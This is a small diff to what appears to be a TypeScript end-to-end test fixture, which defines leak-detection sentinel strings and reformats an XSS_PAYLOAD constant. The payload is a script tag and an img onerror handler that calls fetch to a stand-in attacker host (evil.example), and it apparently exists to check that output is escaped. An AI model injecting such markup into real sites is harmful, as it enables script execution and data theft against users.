@@ -41,7 +41,8 @@ export const TEST_API = "/api/v1/__test__/repair-observation";
 
 export const SECRET_SENTINEL = "SECRET_SENTINEL_ck_e2e_repair_obs_9f3a";
 export const PATH_SENTINEL = "PATH_SENTINEL_should_never_leak";
-export const XSS_PAYLOAD = '<script>window.__xss_fired=1</script><img src=x onerror="fetch(\'https://evil.example/x\')">';
+export const XSS_PAYLOAD =
+  "<script>window.__xss_fired=1</script><img src=x onerror=\"fetch('https://evil.example/x')\">";
 
 export type FixtureName =
   | "F0"
